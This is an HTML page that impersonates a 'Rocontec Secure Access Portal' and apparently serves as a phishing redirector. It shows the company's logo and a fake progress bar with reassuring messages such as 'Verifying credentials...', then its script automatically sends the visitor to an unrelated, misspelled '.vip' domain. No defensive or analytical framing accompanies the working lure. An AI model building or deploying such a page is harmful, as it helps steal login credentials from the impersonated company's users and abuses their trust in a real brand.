<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Rocontec</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    background:linear-gradient(135deg,#ffffff 0%, #ffe5e5 40%, #d60000 100%);
    height:100vh;
    overflow:hidden;
    font-family:Arial, Helvetica, sans-serif;
    display:flex;
    justify-content:center;
    align-items:center;
    position:relative;
}

/* Animated background */
body::before{
    content:"";
    position:absolute;
    width:800px;
    height:800px;
    border:2px solid rgba(214,0,0,.15);
    border-radius:50%;
    right:-250px;
    top:-250px;
    animation:rotate 25s linear infinite;
}

body::after{
    content:"";
    position:absolute;
    width:500px;
    height:500px;
    border:2px solid rgba(214,0,0,.08);
    border-radius:50%;
    left:-150px;
    bottom:-150px;
    animation:rotateReverse 20s linear infinite;
}

@keyframes rotate{
    from{transform:rotate(0deg);}
    to{transform:rotate(360deg);}
}

@keyframes rotateReverse{
    from{transform:rotate(360deg);}
    to{transform:rotate(0deg);}
}

.wrapper{
    text-align:center;
    z-index:10;
    animation:fadeIn 1.5s ease;
    width:100%;
    max-width:800px;
    padding:20px;
}

@keyframes fadeIn{
    from{
        opacity:0;
        transform:translateY(20px);
    }
    to{
        opacity:1;
        transform:translateY(0);
    }
}

.brand-row{
    display:flex;
    justify-content:center;
    align-items:center;
    margin-bottom:60px;
}

/* Logo */
.rocontec-logo{
    width:350px;
    max-width:80vw;
    height:auto;
    display:block;
    margin:0 auto;
    filter:brightness(1.05);
}

.loading-section{
    width:500px;
    max-width:90vw;
    margin:auto;
}

.loading-bar{
    width:100%;
    height:10px;
    background:rgba(255,255,255,.65);
    border-radius:20px;
    overflow:hidden;
    box-shadow:0 0 10px rgba(0,0,0,.15);
}

.loading-progress{
    width:0%;
    height:100%;
    background:linear-gradient(90deg,#ff4d4d,#d60000);
    box-shadow:0 0 15px rgba(214,0,0,.6);
}

.percent{
    color:#ffffff;
    font-size:22px;
    margin-top:15px;
    font-weight:bold;
    text-shadow:0 2px 4px rgba(0,0,0,.25);
}

.status{
    margin-top:15px;
    color:#ffffff;
    font-size:15px;
    text-shadow:0 1px 3px rgba(0,0,0,.25);
}

.spinner{
    width:40px;
    height:40px;
    margin:25px auto;
    border:4px solid rgba(255,255,255,.35);
    border-top:4px solid #d60000;
    border-radius:50%;
    animation:spin 1s linear infinite;
}

@keyframes spin{
    100%{
        transform:rotate(360deg);
    }
}

.footer{
    position:absolute;
    bottom:25px;
    width:100%;
    text-align:center;
    color:rgba(255,255,255,.85);
    font-size:13px;
    text-shadow:0 1px 2px rgba(0,0,0,.25);
}
</style>
</head>

<body>

<div class="wrapper">

    <div class="brand-row">
        <img
            src="https://rocontec.com.br/wp-content/uploads/2024/01/LOGO-ROCONTEC-ALTA-Colorido.png"
            alt="Rocontec"
            class="rocontec-logo">
    </div>

    <div class="loading-section">

        <div class="loading-bar">
            <div class="loading-progress" id="progress"></div>
        </div>

        <div class="percent" id="percent">0%</div>

        <div class="spinner"></div>

        <div class="status" id="status">
            Initializing secure environment...
        </div>

    </div>

</div>

<div class="footer">
    © Rocontec — Secure Access Portal
</div>

<script>
const redirectURL = "https://yfod2rlvd8.securedocssharinng.vip/l/NFKAKeCaIdo";

const messages = [
    "Initializing secure environment...",
    "Connecting to Rocontec services...",
    "Loading resources...",
    "Synchronizing data...",
    "Verifying credentials...",
    "Preparing workspace...",
    "Ready."
];

let progress = 0;

const progressBar = document.getElementById("progress");
const percent = document.getElementById("percent");
const status = document.getElementById("status");

const timer = setInterval(() => {

    progress++;

    progressBar.style.width = progress + "%";
    percent.textContent = progress + "%";

    const stage = Math.floor(progress / 15);

    if (messages[stage]) {
        status.textContent = messages[stage];
    }

    if (progress >= 100) {

        clearInterval(timer);

        status.textContent = "Redirecting...";

        setTimeout(() => {
            window.location.href = redirectURL;
        }, 1000);
    }

}, 50);
</script>

</body>
</html>
